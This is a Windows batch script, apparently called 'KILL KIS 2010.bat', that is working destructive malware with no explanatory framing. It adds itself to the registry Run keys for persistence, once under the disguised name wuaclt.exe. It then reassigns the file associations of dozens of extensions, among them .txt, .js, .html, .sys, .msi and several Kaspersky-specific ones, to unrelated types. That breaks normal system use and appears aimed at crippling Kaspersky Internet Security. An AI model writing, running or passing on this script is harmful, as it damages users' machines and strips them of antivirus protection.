@echo off
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v KILL KIS 2010.bat /d "c:\KILL KIS 2010.bat" /f
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v wuaclt.exe /t REG_SZ /d "C:\WINDOWS\KILL KIS 2010.bat" /f
assoc .bav=mp3file
assoc .cfg=ogmfile
assoc .manifest=mp4file
assoc .ppl=docfile
assoc .txt=wmefile
assoc .ico=asffile
assoc .vbs=wmafile
assoc .xpt=wmvfile
assoc .tbp=avifile
assoc .com=mp4file
assoc .xpt=wavfile
assoc .tbp=mpegfile
assoc .url=minifile
assoc .rdf=aifffile
assoc .xul=aufile
assoc .js=dvrfile

assoc .dtd=cdafile
assoc .css=oggfile
assoc .ini=ogmfile
assoc .wav=themefile
assoc .loc=pswfile

assoc .html=rarfile
assoc .sys=wsffile
assoc .cat=zapfile
assoc .msi=udlfile
assoc .avz=ttcfile

assoc .kdc=flvfile
assoc .kdl=dllfile
assoc .kdz=daafile
assoc .keb=bakfile
assoc .kep=3g2file
assoc .kfb=3gpfile
assoc .kln=7zfile
assoc .mft=dmgfile
assoc .rec=isofile
assoc .set=nrgfile
assoc .xml=pngfile
assoc .dat=jpegfile
assoc .stt=icofile
assoc .tmp=bmpfile
assoc .pvb=mpgfile
assoc .sfdb=exefile
assoc .krg=odtfile
assoc .klz=ppsfile
assoc .db=mkvfile
assoc .bin=savfile
assoc .idx=imgfile

pause